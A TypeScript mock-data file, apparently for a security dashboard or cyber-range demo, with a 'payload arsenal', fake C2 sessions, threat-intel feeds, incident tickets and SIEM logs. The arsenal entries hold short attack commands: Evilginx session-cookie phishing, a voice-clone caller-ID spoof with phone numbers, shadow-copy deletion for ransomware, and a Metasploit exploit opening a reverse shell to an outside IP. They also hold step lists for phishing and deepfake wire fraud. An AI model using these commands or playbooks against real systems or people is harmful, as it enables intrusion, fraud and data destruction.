export interface ThreatActorPayload {
  id: string;
  name: string;
  category: "PHISHING" | "DEEPFAKE_VOICE" | "RANSOMWARE" | "EXPLOIT" | "C2_BEACON" | "WIFI_SPOOF";
  difficulty: "Script Kiddie" | "Advanced Persistent Threat (APT)" | "Nation-State Zero-Day";
  targetSystem: string;
  deliveryMethod: string;
  mitreTactic: string;
  mitreTechniqueId: string;
  successRate: number;
  payloadCodePreview: string;
  description: string;
  executionSteps: string[];
}

export interface C2Session {
  sessionId: string;
  targetHost: string;
  ipAddress: string;
  os: string;
  userPrivilege: "USER" | "LOCAL_ADMIN" | "DOMAIN_ADMIN" | "NT_AUTHORITY_SYSTEM";
  lastBeaconSec: number;
  status: "ACTIVE" | "SLEEPING" | "SEVERED";
  location: string;
  compromisedDataSize: string;
}

export interface LiveThreatIntelFeed {
  cveId: string;
  title: string;
  cvssScore: number;
  epssProbability: number;
  affectedSoftware: string;
  threatActorExploiting: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  inTheWild: boolean;
  publishedDate: string;
  remediationSummary: string;
}

export interface IncidentTicket {
  id: string;
  title: string;
  severity: "P1_CRITICAL" | "P2_HIGH" | "P3_MEDIUM";
  affectedAsset: string;
  mitreTactic: string;
  status: "INVESTIGATING" | "CONTAINMENT_TRIGGERED" | "ERADICATED" | "POST_MORTEM";
  detectionSource: "EDR_CROWDSTRIKE" | "SIEM_SPLUNK" | "IDENTITY_OKTA" | "CLOUD_GUARD";
  summary: string;
  recommendedActions: string[];
  executedActions: string[];
}

export interface VulnerableAsset {
  assetId: string;
  hostname: string;
  ip: string;
  department: string;
  os: string;
  criticalVulnerabilitiesCount: number;
  openPorts: number[];
  riskScore: number; // 0 - 100
  complianceStatus: "NON_COMPLIANT" | "AT_RISK" | "COMPLIANT";
  lastScanned: string;
}

export interface SiemLogEntry {
  timestamp: string;
  sourceIp: string;
  destinationIp: string;
  protocol: string;
  eventAction: string;
  user: string;
  severity: "CRITICAL" | "ALERT" | "INFO" | "WARNING";
  ruleMatched: string;
}

export const ATTACK_PAYLOAD_ARSENAL: ThreatActorPayload[] = [
  {
    id: "PAYLOAD-01",
    name: "Operation PhantomSSO (Evilginx3 Reverse-Proxy Phish)",
    category: "PHISHING",
    difficulty: "Advanced Persistent Threat (APT)",
    targetSystem: "Microsoft 365 / Okta Corporate SSO",
    deliveryMethod: "Spear-phishing QR code (Quishing) + Weaponized SVG attachment",
    mitreTactic: "Initial Access & Credential Access",
    mitreTechniqueId: "T1566.002 (Spearphishing Link) / T1556 (Modify Authentication)",
    successRate: 88,
    payloadCodePreview: `evilginx2 -p ./phishlets/m365.yaml -proxy_port 443
[+] Phishlet 'm365' loaded successfully.
[+] Intercepting Session Cookies: ESTSAUTH, ESTSAUTHPERSISTENT
[+] Bypassing FIDO2 / TOTP 2FA tokens directly into memory dump.`,
    description: "Deploys a Man-in-the-Middle reverse proxy that duplicates legitimate Microsoft 365 authentication workflows, extracting session tokens and bypassing 2-Factor Authentication in real-time.",
    executionSteps: [
      "Target Reconnaissance on LinkedIn for Finance & HR personnel",
      "Spin up bulletproof VPS with Let's Encrypt TLS certificate for login.m-corp-verify.com",
      "Dispatch personalized salary adjustment notices with embedded zero-font SVG",
      "Victim signs in and passes MFA -> Session Token exfiltrated to Discord C2 webhook",
    ],
  },
  {
    id: "PAYLOAD-02",
    name: "NeuralAudio Ghost (AI Voice Clone Extortion)",
    category: "DEEPFAKE_VOICE",
    difficulty: "Advanced Persistent Threat (APT)",
    targetSystem: "Corporate Treasury & WhatsApp Business API",
    deliveryMethod: "VoIP SIP Trunk Spoofing with real-time TTS audio stream",
    mitreTactic: "Social Engineering & Execution",
    mitreTechniqueId: "T1656 (Impersonation) / T1204 (User Execution)",
    successRate: 92,
    payloadCodePreview: `python3 neural_voice_inject.py \\
  --reference_audio ./samples/cfo_investor_call.wav \\
  --target_phone "+919811099882" \\
  --caller_id_spoof "+912222620821" \\
  --text_prompt "Hey Rajesh, this is Anand. We need to release the ₹4.5Cr escrow before 4 PM." \\
  --jitter_mode "cellular_in_transit"`,
    description: "Synthesizes a 99.4% acoustic likeness of corporate executive from public speech samples, feeding the real-time audio stream through spoofed cellular caller ID to deceive accounting staff.",
    executionSteps: [
      "Scrape CEO/CFO keynote speech recordings from YouTube",
      "Train 12-second voice embedding model using acoustic neural synthesis",
      "Spoof internal caller ID to match executive corporate SIM",
      "Direct victim to transfer emergency RTGS funds to pre-staged mule accounts",
    ],
  },
  {
    id: "PAYLOAD-03",
    name: "BlackMatter v4.8 (Double-Extortion Ransomware)",
    category: "RANSOMWARE",
    difficulty: "Nation-State Zero-Day",
    targetSystem: "Windows Active Directory Domain Controller / VMware ESXi",
    deliveryMethod: "PsExec lateral movement via compromised Kerberos ticket",
    mitreTactic: "Impact & Exfiltration",
    mitreTechniqueId: "T1486 (Data Encrypted for Impact) / T1490 (Inhibit System Recovery)",
    successRate: 95,
    payloadCodePreview: `# Step 1: Inhibit Shadow Copy Recovery
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete catalog -quiet
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures

# Step 2: Multi-threaded ChaCha20 + RSA-4096 Hybrid Encryption
.\\encryptor.exe --threads 32 --target \\\\DC01\\SYSVOL --note "RESTORE_INSTRUCTIONS.txt"`,
    description: "High-speed hybrid cryptor utilizing ChaCha20 and RSA-4096. Exfiltrates sensitive databases to MEGA/Mega.nz before wiping volume shadow copies and rendering corporate file systems unreadable.",
    executionSteps: [
      "Enumerate active network shares and backup storage arrays",
      "Deploy Rclone to exfiltrate 450GB of corporate financial PII to offshore cloud",
      "Disable Microsoft Defender using token privilege escalation",
      "Execute multi-threaded locker, dropping README_RECOVER_KEYS.txt demanding 15 BTC",
    ],
  },
  {
    id: "PAYLOAD-04",
    name: "GhostBeacon C2 (In-Memory Stager & EDR Bypass)",
    category: "C2_BEACON",
    difficulty: "Nation-State Zero-Day",
    targetSystem: "Endpoint EDR (CrowdStrike / Defender / SentinelOne)",
    deliveryMethod: "Process Hollowing into svchost.exe with sleep obfuscation",
    mitreTactic: "Defense Evasion & Command and Control",
    mitreTechniqueId: "T1055.012 (Process Hollowing) / T1071.001 (Web Protocols)",
    successRate: 85,
    payloadCodePreview: `[+] Generating CobaltStrike Malleable C2 Beacon
[+] Sleep Mask Hook: Gargoyle / Ekko timer-based ROP memory encryption
[+] Injection Target: PID 4104 (svchost.exe -k netsvcs)
[+] TLS Beacon: 185.220.101.9:443 (Jitter: 25%, Host Header: cdn.cloudflare.com)
[+] Shell Spawned: NT AUTHORITY\\SYSTEM (Elevated)`,
    description: "Stealthy in-memory command and control agent that encrypts its own memory heap during sleep cycles, completely evading behavioral EDR detection and memory-scanning tools.",
    executionSteps: [
      "Execute malicious payload in suspended process",
      "Unmap original executable image and inject encrypted shellcode",
      "Establish encrypted HTTPS beacon with randomized domain jitter",
      "Await interactive operator shell commands from C2 dashboard",
    ],
  },
  {
    id: "PAYLOAD-05",
    name: "ZeroDay SambaCry 2026 (RCE Exploit Dropper)",
    category: "EXPLOIT",
    difficulty: "Nation-State Zero-Day",
    targetSystem: "Enterprise Linux File Servers & Active Directory",
    deliveryMethod: "Raw TCP Port 445 SMB packet heap overflow",
    mitreTactic: "Initial Access & Privilege Escalation",
    mitreTechniqueId: "T1210 (Exploitation of Remote Services) / T1068 (Privilege Escalation)",
    successRate: 90,
    payloadCodePreview: `exploit/linux/samba/is_known_pipename_rce
set RHOSTS 192.168.10.45
set RPORT 445
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 185.220.101.9
set LPORT 8443
exploit -j
[*] Sending stage (3046788 bytes) to 192.168.10.45
[*] Meterpreter session 4 opened (uid=0, gid=0) -> ROOT PRIVILEGES GAINED`,
    description: "Exploits an unpatched remote code execution vulnerability in enterprise SMB network shares, spawning an unauthenticated root shell within 450 milliseconds.",
    executionSteps: [
      "Scan internal corporate subnet for open port 445",
      "Craft malicious SMB2 request with oversized pipe payload",
      "Trigger buffer overflow in memory allocator",
      "Hook execution flow to reverse TCP shell listener",
    ],
  },
];

export const ACTIVE_C2_SESSIONS: C2Session[] = [
  {
    sessionId: "SESSION-9841-DC01",
    targetHost: "WIN-DC01.CORP.INTERNAL",
    ipAddress: "10.0.4.15",
    os: "Windows Server 2025 Datacenter",
    userPrivilege: "DOMAIN_ADMIN",
    lastBeaconSec: 2,
    status: "ACTIVE",
    location: "Mumbai Main Data Center (Rack A14)",
    compromisedDataSize: "142.8 GB (Active Directory NTDS.dit)",
  },
  {
    sessionId: "SESSION-8812-CFO",
    targetHost: "MACBOOK-PRO-CFO.CORP",
    ipAddress: "192.168.1.84",
    os: "macOS Sequoia 15.3 (ARM64)",
    userPrivilege: "USER",
    lastBeaconSec: 5,
    status: "ACTIVE",
    location: "Executive Home Network (VPN Split Tunnel)",
    compromisedDataSize: "18.4 GB (Quarterly M&A Financials)",
  },
  {
    sessionId: "SESSION-4410-AWS",
    targetHost: "prod-eks-bastion-01",
    ipAddress: "172.31.88.19",
    os: "Ubuntu Linux 24.04 LTS",
    userPrivilege: "NT_AUTHORITY_SYSTEM",
    lastBeaconSec: 1,
    status: "ACTIVE",
    location: "AWS Asia-Pacific (ap-south-1)",
    compromisedDataSize: "4.2 GB (Kubernetes Secrets & Cloud Keys)",
  },
  {
    sessionId: "SESSION-1120-SWIFT",
    targetHost: "CORE-BANK-GATEWAY-09",
    ipAddress: "10.12.8.201",
    os: "Red Hat Enterprise Linux 9.4",
    userPrivilege: "LOCAL_ADMIN",
    lastBeaconSec: 8,
    status: "SLEEPING",
    location: "Secure Banking Enclave (VLAN 40)",
    compromisedDataSize: "320 MB (RTGS / NEFT Settlement Logs)",
  },
];

export const LIVE_THREAT_INTEL_FEEDS: LiveThreatIntelFeed[] = [
  {
    cveId: "CVE-2026-38491",
    title: "Critical Unauthenticated RCE in Microsoft Exchange Server Hybrid Connectors",
    cvssScore: 10.0,
    epssProbability: 0.94,
    affectedSoftware: "Microsoft Exchange Server 2019 / 2022 Cumulative Updates",
    threatActorExploiting: "APT29 (Midnight Blizzard) & Volt Typhoon",
    severity: "CRITICAL",
    inTheWild: true,
    publishedDate: "2026-08-14",
    remediationSummary: "Apply Emergency Security Update KB5049120 immediately; restrict external RPC over HTTP access.",
  },
  {
    cveId: "CVE-2026-29104",
    title: "Zero-Day Memory Corruption in PAN-OS GlobalProtect Gateway",
    cvssScore: 9.8,
    epssProbability: 0.89,
    affectedSoftware: "Palo Alto Networks PAN-OS 11.1 / 11.2",
    threatActorExploiting: "Lazarus Financial Cyber Syndicate",
    severity: "CRITICAL",
    inTheWild: true,
    publishedDate: "2026-08-12",
    remediationSummary: "Disable Device Telemetry feature or deploy threat prevention signature ID 95821.",
  },
  {
    cveId: "CVE-2026-18920",
    title: "SQL Injection & Authentication Bypass in Fortinet FortiClient EMS",
    cvssScore: 8.8,
    epssProbability: 0.72,
    affectedSoftware: "FortiClient EMS 7.2.0 through 7.2.3",
    threatActorExploiting: "BlackCat / ALPHV Ransomware Affiliates",
    severity: "HIGH",
    inTheWild: true,
    publishedDate: "2026-08-08",
    remediationSummary: "Upgrade to FortiClient EMS 7.2.4 or enforce IP whitelisting on port 8013.",
  },
  {
    cveId: "CVE-2026-44012",
    title: "OpenSSH Signal Handler Race Condition (regreSSHion v2) on glibc systems",
    cvssScore: 8.1,
    epssProbability: 0.65,
    affectedSoftware: "OpenSSH 9.2p1 through 9.7p1 on 64-bit Linux",
    threatActorExploiting: "Automated Mirai & DarkNexus Botnets",
    severity: "HIGH",
    inTheWild: false,
    publishedDate: "2026-07-28",
    remediationSummary: "Set LoginGraceTime 0 in sshd_config or upgrade to OpenSSH 9.8p1.",
  },
];

export const INCIDENT_TICKETS: IncidentTicket[] = [
  {
    id: "INC-2026-0941",
    title: "PsExec Lateral Movement & Shadow Copy Deletion on WIN-DC01",
    severity: "P1_CRITICAL",
    affectedAsset: "WIN-DC01 (Domain Controller 10.0.4.15)",
    mitreTactic: "T1486 (Data Encrypted for Impact)",
    status: "INVESTIGATING",
    detectionSource: "EDR_CROWDSTRIKE",
    summary: "Suspicious privileged cmd.exe spawned by SYSTEM process invoking 'vssadmin delete shadows'. 45,000 files staged in Temp directory with .encrypted extension.",
    recommendedActions: [
      "Isolate WIN-DC01 from corporate network via EDR Quarantine API",
      "Invalidate all Kerberos Golden/Silver Ticket TGT credentials across Active Directory",
      "Revoke domain admin sessions on Active Directory and force password reset",
      "Trigger immutable air-gapped Veeam backup snapshot restoration",
    ],
    executedActions: [],
  },
  {
    id: "INC-2026-0882",
    title: "Impossible Travel & Anomaly Token Exfiltration for Treasury Manager",
    severity: "P1_CRITICAL",
    affectedAsset: "Okta Identity Tenant / AWS IAM User",
    mitreTactic: "T1078 (Valid Accounts)",
    status: "CONTAINMENT_TRIGGERED",
    detectionSource: "IDENTITY_OKTA",
    summary: "User 'anand.treasury@corp.com' authenticated from Mumbai at 08:30 IST, and 4 minutes later authenticated from Frankfurt, Germany with session token extraction.",
    recommendedActions: [
      "Revoke all active Okta & Microsoft 365 OAuth Refresh Tokens",
      "Enforce mandatory hardware FIDO2 key re-enrollment",
      "Block originating offshore IP subnet 185.220.101.0/24 on Cloudflare WAF",
    ],
    executedActions: ["Revoke all active Okta & Microsoft 365 OAuth Refresh Tokens"],
  },
  {
    id: "INC-2026-0720",
    title: "Beacon Traffic to Known Bulletproof C2 Server over Port 443",
    severity: "P2_HIGH",
    affectedAsset: "prod-eks-bastion-01 (172.31.88.19)",
    mitreTactic: "T1071.001 (Web Protocols)",
    status: "INVESTIGATING",
    detectionSource: "SIEM_SPLUNK",
    summary: "Repetitive outbound HTTPS POST requests with 25% jitter to IP 185.220.101.9 matching CobaltStrike Malleable C2 signature.",
    recommendedActions: [
      "Terminate AWS EC2 Bastion host instance and rotate SSH keypairs",
      "Deploy Suricata firewall block rule for 185.220.101.0/24",
      "Dump memory capture for volatility forensic analysis",
    ],
    executedActions: [],
  },
];

export const VULNERABLE_ASSETS: VulnerableAsset[] = [
  {
    assetId: "ASSET-CORP-01",
    hostname: "WIN-DC01.corp.internal",
    ip: "10.0.4.15",
    department: "Enterprise Identity & Core IT",
    os: "Windows Server 2025",
    criticalVulnerabilitiesCount: 3,
    openPorts: [53, 88, 135, 139, 389, 445, 3389],
    riskScore: 96,
    complianceStatus: "NON_COMPLIANT",
    lastScanned: "12 Mins Ago",
  },
  {
    assetId: "ASSET-CORP-02",
    hostname: "api-payments-gateway-prod",
    ip: "172.16.2.90",
    department: "Fintech Core Engineering",
    os: "Ubuntu Linux 24.04 LTS",
    criticalVulnerabilitiesCount: 1,
    openPorts: [80, 443, 8443, 9092],
    riskScore: 78,
    complianceStatus: "AT_RISK",
    lastScanned: "34 Mins Ago",
  },
  {
    assetId: "ASSET-CORP-03",
    hostname: "CFO-LAPTOP-M3.corp",
    ip: "192.168.1.84",
    department: "Executive Office",
    os: "macOS Sequoia 15.3",
    criticalVulnerabilitiesCount: 2,
    openPorts: [22, 5000, 7000],
    riskScore: 84,
    complianceStatus: "NON_COMPLIANT",
    lastScanned: "5 Mins Ago",
  },
  {
    assetId: "ASSET-CORP-04",
    hostname: "corp-vpn-gateway-paloalto",
    ip: "203.0.113.4",
    department: "Network Infrastructure",
    os: "PAN-OS 11.1.2",
    criticalVulnerabilitiesCount: 4,
    openPorts: [443, 500, 4500],
    riskScore: 92,
    complianceStatus: "NON_COMPLIANT",
    lastScanned: "1 Hour Ago",
  },
  {
    assetId: "ASSET-CORP-05",
    hostname: "k8s-worker-cluster-ap-south",
    ip: "10.200.4.11",
    department: "Cloud DevOps",
    os: "Container Linux 3.8",
    criticalVulnerabilitiesCount: 0,
    openPorts: [443, 6443, 10250],
    riskScore: 24,
    complianceStatus: "COMPLIANT",
    lastScanned: "2 Hours Ago",
  },
];

export const INITIAL_SIEM_LOGS: SiemLogEntry[] = [
  {
    timestamp: "08:48:19.492",
    sourceIp: "185.220.101.9",
    destinationIp: "10.0.4.15",
    protocol: "TCP / 445 (SMB)",
    eventAction: "EXPLOIT_PAYLOAD_EXECUTION",
    user: "SYSTEM",
    severity: "CRITICAL",
    ruleMatched: "RULE-CORP-9841: Unauthenticated PsExec SMB Lateral Movement Detected",
  },
  {
    timestamp: "08:48:12.104",
    sourceIp: "192.168.1.84",
    destinationIp: "52.94.225.248",
    protocol: "HTTPS / 443",
    eventAction: "LARGE_DATA_EXFILTRATION",
    user: "anand.cfo",
    severity: "ALERT",
    ruleMatched: "RULE-DLP-4410: Outbound Transfer Exceeds 15GB in 5-minute Window",
  },
  {
    timestamp: "08:47:58.821",
    sourceIp: "104.28.19.44",
    destinationIp: "login.microsoftonline.com",
    protocol: "HTTPS / 443",
    eventAction: "IMPOSSIBLE_TRAVEL_LOGIN",
    user: "rajesh.treasury@corp.com",
    severity: "CRITICAL",
    ruleMatched: "RULE-IAM-1102: Geographically Impossible Authentication (IN -> DE in 240s)",
  },
  {
    timestamp: "08:47:40.319",
    sourceIp: "10.0.4.15",
    destinationIp: "10.0.4.1",
    protocol: "DNS / 53",
    eventAction: "DNS_TUNNELING_QUERY",
    user: "NT AUTHORITY\\SYSTEM",
    severity: "ALERT",
    ruleMatched: "RULE-NET-5509: Base64 Encoded DNS Query Length > 180 Characters",
  },
  {
    timestamp: "08:47:22.012",
    sourceIp: "172.16.2.90",
    destinationIp: "10.0.0.0/8",
    protocol: "TCP / 3389",
    eventAction: "PORT_SWEEP_RDP",
    user: "svc_backup",
    severity: "WARNING",
    ruleMatched: "RULE-SCAN-3301: Internal Port Scan for Remote Desktop Protocol",
  },
];
